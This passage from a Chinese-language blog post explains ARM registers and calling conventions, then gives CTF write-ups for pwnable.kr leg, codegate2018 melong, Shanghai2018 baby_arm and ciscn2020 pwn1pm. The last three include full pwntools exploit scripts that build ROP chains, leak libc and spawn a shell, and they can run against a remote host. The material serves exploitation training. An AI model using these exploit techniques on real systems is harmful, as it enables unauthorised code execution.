Pointer:栈指针</td></tr><tr><td align="center">R30</td><td align="center">LR</td><td align="center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td></tr><tr><td align="center">R29</td><td align="center">FP</td><td align="center">Frame Pointer:保存函数栈的基地址。</td></tr><tr><td align="center">R19-R28</td><td align="center">–</td><td align="center">Callee-saved registers（含义见上面术语解释）</td></tr><tr><td align="center">R18</td><td align="center">–</td><td align="center">平台寄存器，有特定平台解释其用法。</td></tr><tr><td align="center">R17</td><td align="center">IP1</td><td align="center">The second intra-procedure-call temporary register……</td></tr><tr><td align="center">R16</td><td align="center">IP0</td><td align="center">The first intra-procedure-call temporary register……</td></tr><tr><td align="center">R9-R15</td><td align="center">–</td><td align="center">临时寄存器</td></tr><tr><td align="center">R8</td><td align="center">–</td><td align="center">在一些情况下，返回值是通过R8返回的</td></tr><tr><td align="center">R0-R7</td><td align="center">–</td><td align="center">在函数调用过程中传递参数和返回值</td></tr><tr><td align="center">NZCV</td><td align="center">–</td><td align="center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td></tr></tbody></table><h2 id="ARM函数调用约定"><a href="#ARM函数调用约定" class="headerlink" title="ARM函数调用约定"></a>ARM函数调用约定</h2><p>ARM/ARM64使用的是AAPCS或ATPCS标准。</p><p>ATPCS即为ARM-Thumb Procedure Call Standard/ARM-Thumb过程调用标准，规定了一些子程序间调用的基本规则，这些规则包括子程序调用过程中寄存器的使用规则，数据栈的使用规则，参数的传递规则。有了这些规则之后，单独编译的C语言程序就可以和汇编程序相互调用。使用ADS(ARM Developer Suite)的C语言编译器编译的C语言子程序满足用户指定的ATPCS类型。而对于汇编语言来说，则需要用户来保证各个子程序满足ATPCS的要求。</p><p>而AAPCS即为ARM Archtecture Procedure Call Standard是2007年ARM公司正式推出的新标准，AAPCS是ATPCS的改进版，目前， AAPCS和ATPCS都是可用的标准。</p><p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中。</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="arm call convention"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="pwnable-kr-leg"><a href="#pwnable-kr-leg" class="headerlink" title="pwnable.kr leg"></a>pwnable.kr leg</h3><p>该题目就是考察PC预取两条指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>key1函数将当前的PC读入R3，R3会被移入R0，当作返回值。如上所示，当前PC是<code>0x00008cdc+8</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>key2函数变换了一下ARM/THUMB模式，THUMB中指令长度是2字节，预取两条指令就是+4。这个函数也是R3中的值当作返回值。</p><p>在THUMB模式中将PC（0x00008d04+4）移入R3，然后R3又加了4。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>key3将lr（返回地址）读入r3。找到main函数中调用key3函数的位置，+4即为返回地址。</p><h3 id="codegate2018-melong"><a href="#codegate2018-melong" class="headerlink" title="codegate2018 melong"></a>codegate2018 melong</h3><p>这个执行文件中，用了很多浮点库函数，加减乘除和浮点比较等等，所以看起来有点抽象。</p><p>漏洞点在PT中的size，输入一个无法malloc的大小，就能绕过检查。</p><p>write_diary使用size的低字节作为输入长度，存在溢出。</p><p>多次运行程序可以发现，libc加载地址没有变化，所以可以第一次泄露libc，第二次getshell。</p><p>我从<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/#codegate2018---melong">m4x</a>师傅那里看到一个方法，但不明白是如何返回的main函数。。。</p><blockquote><p>2020-10-18更新</p><p>先前LR中所存储的地址是某个函数调用留下的，第一次ROP puts执行完毕，回到了这个地址，pop了PC。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">localfile = <span class="string">&quot;./melong&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line">context.binary = localfile</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your height(meters) : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your weight(kilograms) : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PT</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;How long do you want to take personal training?\n&quot;</span>)</span><br><span class="line">    io.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_diary</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="comment"># 0x00011bbc : pop &#123;r0, pc&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    g1 = <span class="number">0x00011bbc</span></span><br><span class="line"></span><br><span class="line">    check()</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;&quot;&quot;b *0x11288</span></span><br><span class="line">    <span class="comment"># b *0x1118C</span></span><br><span class="line">    <span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">    PT(<span class="number">-1</span>)</span><br><span class="line">    payload1 = <span class="string">b&quot;A&quot;</span>*<span class="number">0x54</span> + p32(g1) + p32(elf.got[<span class="string">&quot;puts&quot;</span>]) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(elf.sym[<span class="string">&quot;main&quot;</span>])*<span class="number">6</span></span><br><span class="line">    write_diary(payload1)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;See you again :)\n&quot;</span>)</span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    pf(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span class="line">    libc.address = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    check()</span><br><span class="line">    PT(<span class="number">-1</span>)</span><br><span class="line">    payload2 = <span class="string">b&quot;A&quot;</span>*<span class="number">0x54</span> + p32(g1) + p32(next(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))) + p32(libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    write_diary(payload2)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, localfile])</span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="Shanghai2018-baby-arm"><a href="#Shanghai2018-baby-arm" class="headerlink" title="Shanghai2018 baby_arm"></a>Shanghai2018 baby_arm</h3><p>aarch64的栈帧布局发生了变化，X29(fp), X30(lr)存储在栈帧底部，数据在上方。</p><p>程序首先读入512字节到bss，然后在子函数（栈帧长0x50）中读入512的数据到栈上，存在溢出。程序有一段未执行的函数，调用了mprotect将0x411000开始的0x1000字节（这段地址包含got，bss等）权限设置为0。</p><p>受此启发，将shellcode读到bss，使用mprotect修改这段地址为可执行，然后劫持控制到bss。</p><p>使用<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#ret2csu">ret2csu</a>的方式进行设置参数劫持调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 位于main函数下方的csu函数</span><br><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">localfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment"># locallibc = &quot;&quot;</span></span><br><span class="line">context.binary = localfile</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span></span><br><span class="line"><span class="string">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line"><span class="string">.text:00000000004008B0                 MOV             X2, X22</span></span><br><span class="line"><span class="string">.text:00000000004008B4                 MOV             X1, X23</span></span><br><span class="line"><span class="string">.text:00000000004008B8                 MOV             W0, W24</span></span><br><span class="line"><span class="string">.text:00000000004008BC                 ADD             X19, X19, #1</span></span><br><span class="line"><span class="string">.text:00000000004008C0                 BLR             X3</span></span><br><span class="line"><span class="string">.text:00000000004008C4                 CMP             X19, X20</span></span><br><span class="line"><span class="string">.text:00000000004008C8                 B.NE            loc_4008AC</span></span><br><span class="line"><span class="string">.text:00000000004008CC</span></span><br><span class="line"><span class="string">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span></span><br><span class="line"><span class="string">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="string">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="string">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="string">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="string">.text:00000000004008DC                 RET</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">X21 = address of function address</span></span><br><span class="line"><span class="string">X22 = X2</span></span><br><span class="line"><span class="string">X23 = X1</span></span><br><span class="line"><span class="string">W24 = W0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_rop</span>(<span class="params">call, x0, x1, x2, ret</span>):</span></span><br><span class="line">    payload  = p64(<span class="number">0x4008CC</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4008AC</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call) + p64(x2)</span><br><span class="line">    payload += p64(x1) + p64(x0)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>) + p64(ret)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sc = asm(shellcraft.execve(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(sc)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + csu_rop(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, elf.got[<span class="string">&quot;__gmon_start__&quot;</span>], <span class="number">8</span>, <span class="number">0x400824</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(p64(elf.plt[<span class="string">&quot;mprotect&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(sc)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + csu_rop(elf.got[<span class="string">&quot;__gmon_start__&quot;</span>], <span class="number">0x411000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, <span class="number">0x411068</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line"><span class="comment"># libc = ELF(locallibc)</span></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ciscn2020-final-pwn1pm"><a href="#ciscn2020-final-pwn1pm" class="headerlink" title="ciscn2020 final pwn1pm"></a>ciscn2020 final pwn1pm</h3><p>主要使用了以下两个gadget，控制函数第一个参数。调用printf泄露libc地址，然后<code>system(&quot;bin/sh&quot;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00010348 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000104f8 : mov r0, r3 ; sub sp, fp, #4 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure><p>同一个shell进程本地运行多次可以发现，程序库加载地址和栈地址不会发生变化，但是在另一个shell进程就可能有变化。幸运的是，地址似乎只有两种变化，非此即彼。</p><p>因为<code>sub sp, fp, #4</code>，这里假定了服务器端的栈地址和本地一致，实际不确定。。。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/10c96609740f1c6fadd9ac88a642c1fd0e3eb3d5/others/armpwn/ciscn2020_final_pwn1pm/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./bin&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00010348 : pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="string">0x000104f8 : mov r0, r3 ; sub sp, fp, #4 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span> + p32(<span class="number">0xfffeeffc</span>) + p32(<span class="number">0x10348</span>) + p32(elf.got[<span class="string">&quot;read&quot;</span>]) + p32(<span class="number">0x104f8</span>) + p32(elf.plt[<span class="string">&quot;printf&quot;</span>])*<span class="number">2</span> + p32(elf.sym[<span class="string">&quot;main&quot;</span>])*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;input: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    libc.address = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span> + p32(<span class="number">0xfffef024</span>) + p32(<span class="number">0x10348</span>) + p32(next(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))) + p32(<span class="number">0x104f8</span>) + p32(libc.sym[<span class="string">&quot;system&quot;</span>])*<span class="number">2</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;input: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io  = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./bin&quot;])</span></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></li><li><a href="https://www.anquanke.com/post/id/199112">ARM架构下的 Pwn 的一般解决思路</a></li><li><a href="https://docs.pwntools.com/en/stable/qemu.html">pwntools doc: QEMU Utilities</a></li><li><a href="https://azeria-labs.com/writing-arm-assembly-part-1/">ARM Assembly Basics Tutorial Series by Azeria</a></li><li><a 